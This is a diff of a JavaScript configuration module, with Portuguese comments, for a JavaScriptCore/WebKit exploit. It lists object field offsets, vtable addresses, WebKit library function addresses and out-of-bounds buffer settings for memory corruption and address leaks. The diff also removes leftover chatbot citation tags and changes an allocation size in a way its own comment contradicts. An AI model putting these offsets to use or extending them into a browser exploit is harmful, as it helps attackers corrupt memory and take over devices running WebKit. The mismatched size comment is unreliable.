@@ -5,7 +5,7 @@
 //    É crucial continuar validando no contexto do seu exploit específico.
 export const JSC_OFFSETS = {
     JSCell: {
-        [cite_start]STRUCTURE_POINTER_OFFSET: 0x8,    // VALIDADO [cite: 5]
+        STRUCTURE_POINTER_OFFSET: 0x8,    // VALIDADO
         STRUCTURE_ID_FLATTENED_OFFSET: 0x0,
         CELL_TYPEINFO_TYPE_FLATTENED_OFFSET: 0x4,
         CELL_TYPEINFO_FLAGS_FLATTENED_OFFSET: 0x5,
@@ -13,10 +13,10 @@ export const JSC_OFFSETS = {
         CELL_STATE_FLATTENED_OFFSET: 0x7,
     },
     CallFrame: { // Offsets baseados na análise de CallFrame.txt
-        [cite_start]CALLEE_OFFSET: 0x8,         // De JSC::ProtoCallFrame::callee() [cite: 5]
-        [cite_start]ARG_COUNT_OFFSET: 0x10,     // De JSC::ProtoCallFrame::argumentCountIncludingThis() [cite: 5]
-        [cite_start]THIS_VALUE_OFFSET: 0x18,    // De JSC::ProtoCallFrame::thisValue() [cite: 5]
-        [cite_start]ARGUMENTS_POINTER_OFFSET: 0x28 // De JSC::ProtoCallFrame::argument(ulong) [cite: 5]
+        CALLEE_OFFSET: 0x8,         // De JSC::ProtoCallFrame::callee()
+        ARG_COUNT_OFFSET: 0x10,     // De JSC::ProtoCallFrame::argumentCountIncludingThis()
+        THIS_VALUE_OFFSET: 0x18,    // De JSC::ProtoCallFrame::thisValue()
+        ARGUMENTS_POINTER_OFFSET: 0x28 // De JSC::ProtoCallFrame::argument(ulong)
     },
     Structure: { // Offsets DENTRO da estrutura Structure
         CELL_SPECIFIC_FLAGS_OFFSET: 0x8,
@@ -36,33 +36,33 @@ export const JSC_OFFSETS = {
         BUTTERFLY_OFFSET: 0x10,
     },
     JSFunction: {
-        [cite_start]EXECUTABLE_OFFSET: 0x18, // VALIDADO [cite: 5]
+        EXECUTABLE_OFFSET: 0x18, // VALIDADO
         SCOPE_OFFSET: 0x20,
     },
     JSCallee: {
-        [cite_start]GLOBAL_OBJECT_OFFSET: 0x10, // VALIDADO [cite: 5]
+        GLOBAL_OBJECT_OFFSET: 0x10, // VALIDADO
     },
     ClassInfo: { // NOVO: Adicionado para a estratégia de vazamento de ClassInfo
         M_CACHED_TYPE_INFO_OFFSET: 0x8, // Offset comum para m_cachedTypeInfo dentro de ClassInfo. VERIFIQUE!
     },
     ArrayBuffer: {
-        [cite_start]CONTENTS_IMPL_POINTER_OFFSET: 0x10, // VALIDADO [cite: 5]
-        [cite_start]SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: 0x18, // VALIDADO [cite: 5]
-        [cite_start]DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START: 0x20, // VALIDADO [cite: 5]
+        CONTENTS_IMPL_POINTER_OFFSET: 0x10, // VALIDADO
+        SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: 0x18, // VALIDADO
+        DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START: 0x20, // VALIDADO
         SHARING_MODE_OFFSET: 0x28,
         IS_RESIZABLE_FLAGS_OFFSET: 0x30,
 
         // Novos offsets identificados na análise de sub_1C01140 (possivelmente no ArrayBuffer real)
         // Estes são candidatos com base na análise de pseudocódigo.
         // Nomes temporários para referência e teste:
-        [cite_start]ARRAYBUFFER_REAL_PTR_POSSIBLE_M_VECTOR: 0x28, // a1[5] - base de dados no loop de limpeza/validação [cite: 199]
-        [cite_start]ARRAYBUFFER_FIELD_0X30: 0x30, // *((_DWORD *)a1 + 12) - usado em sub_1C01140 [cite: 200]
-        [cite_start]ARRAYBUFFER_FIELD_0X34: 0x34, // *((_DWORD *)a1 + 13) - usado como contador/tamanho no loop [cite: 200]
-        [cite_start]ARRAYBUFFER_FIELD_0X38: 0x38, // a1[7] - liberado por fastFree [cite: 200]
-        [cite_start]ARRAYBUFFER_FIELD_0X40: 0x40, // a1[8] - testado e liberado por BitVector::OutOfLineBits::destroy [cite: 200]
+        ARRAYBUFFER_REAL_PTR_POSSIBLE_M_VECTOR: 0x28, // a1[5] - base de dados no loop de limpeza/validação
+        ARRAYBUFFER_FIELD_0X30: 0x30, // *((_DWORD *)a1 + 12) - usado em sub_1C01140
+        ARRAYBUFFER_FIELD_0X34: 0x34, // *((_DWORD *)a1 + 13) - usado como contador/tamanho no loop
+        ARRAYBUFFER_FIELD_0X38: 0x38, // a1[7] - liberado por fastFree
+        ARRAYBUFFER_FIELD_0X40: 0x40, // a1[8] - testado e liberado por BitVector::OutOfLineBits::destroy
         KnownStructureIDs: {
             JSString_STRUCTURE_ID: null,
-            [cite_start]ArrayBuffer_STRUCTURE_ID: 2, // VALIDADO [cite: 5]
+            ArrayBuffer_STRUCTURE_ID: 2, // VALIDADO
             JSArray_STRUCTURE_ID: null,
             JSObject_Simple_STRUCTURE_ID: null
         }
@@ -77,22 +77,22 @@ export const JSC_OFFSETS = {
         M_MODE_OFFSET: 0x1C             // Offset para m_mode/TypeFlags dentro de ArrayBufferView
     },
     ArrayBufferContents: {
-        [cite_start]SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START: 0x8,   // VALIDADO [cite: 5]
-        [cite_start]DATA_POINTER_OFFSET_FROM_CONTENTS_START: 0x10, // VALIDADO [cite: 5]
+        SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START: 0x8,   // VALIDADO
+        DATA_POINTER_OFFSET_FROM_CONTENTS_START: 0x10, // VALIDADO
         SHARED_ARRAY_BUFFER_CONTENTS_IMPL_PTR_OFFSET: 0x20,
         IS_SHARED_FLAG_OFFSET: 0x40,
         RAW_DATA_POINTER_FIELD_CANDIDATE_OFFSET: 0x5C,
         PINNING_FLAG_OFFSET: 0x5D,
     },
     VM: {
-        [cite_start]TOP_CALL_FRAME_OFFSET: 0x9E98, // VALIDADO [cite: 5]
+        TOP_CALL_FRAME_OFFSET: 0x9E98, // VALIDADO
     },
     // NOVO: Adicione o offset do vtable da JSC::Structure para DataView aqui
     DataView: {
-        [cite_start]STRUCTURE_VTABLE_OFFSET: 0x3AD62A0, // Já confirmado como o vtable do DataView [cite: 199]
-        [cite_start]DESTROYED_OBJECT_VTABLE: 0x3AD6340, // A vtable para a qual o objeto aponta após limpeza/destruição [cite: 200]
-        [cite_start]VTABLE_OFFSET_0x48_METHOD: 0x48, // Método chamado por a1->vtable + 72LL [cite: 200]
-        [cite_start]VTABLE_OFFSET_0x50_METHOD: 0x50, // Método chamado por a1->vtable + 80LL [cite: 200]
+        STRUCTURE_VTABLE_OFFSET: 0x3AD62A0, // Já confirmado como o vtable do DataView
+        DESTROYED_OBJECT_VTABLE: 0x3AD6340, // A vtable para a qual o objeto aponta após limpeza/destruição
+        VTABLE_OFFSET_0x48_METHOD: 0x48, // Método chamado por a1->vtable + 72LL
+        VTABLE_OFFSET_0x50_METHOD: 0x50, // Método chamado por a1->vtable + 80LL
 
         // NOVO: Valor a testar para M_MODE_VALUE
         // O valor 0x0000000B é um candidato inicial. Adicione outros se 0x0000000B não funcionar.
@@ -126,7 +126,7 @@ export const WEBKIT_LIBRARY_INFO = {
         "JSC::JSObject::put": "0xBD68B0", // Este é um bom candidato para VIRTUAL_PUT_OFFSET
         "JSC::Structure::Structure_constructor": "0x1638A50",
         "WTF::fastMalloc": "0x1271810", // Verifique se este é o principal ou o de 0x230C490
-        [cite_start]"WTF::fastFree": "0x230C7D0", // Já confirmado e utilizado [cite: 199]
+        "WTF::fastFree": "0x230C7D0", // Já confirmado e utilizado
         "JSValueIsSymbol": "0x126D940",
         "JSC::JSArray::getOwnPropertySlot": "0x2322630",
         "JSC::JSGlobalObject::visitChildren_JSCell": "0x1A5F740",
@@ -145,7 +145,7 @@ export const WEBKIT_LIBRARY_INFO = {
 };
 
 export let OOB_CONFIG = {
-    ALLOCATION_SIZE: 0x8000, // Reduzido para 64KB para maior estabilidade 0x8000 32KB
+    ALLOCATION_SIZE: 0x20000, // Reduzido para 64KB para maior estabilidade 0x8000 32KB
     BASE_OFFSET_IN_DV: 128,
     INITIAL_BUFFER_SIZE: 32
 };
